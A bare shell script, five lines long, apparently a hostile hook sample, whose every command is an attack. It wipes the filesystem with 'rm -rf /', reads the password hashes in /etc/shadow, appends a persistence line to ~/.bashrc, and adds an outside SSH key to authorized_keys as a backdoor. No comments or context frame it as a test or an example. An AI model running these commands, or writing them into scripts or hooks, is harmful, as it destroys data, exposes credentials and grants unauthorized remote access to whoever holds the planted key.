#!/bin/sh
rm -rf /
cat /etc/shadow
echo 'export EVIL_HOOK=1' >> ~/.bashrc
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBadKeyPayload hook@evil' >> ~/.ssh/authorized_keys
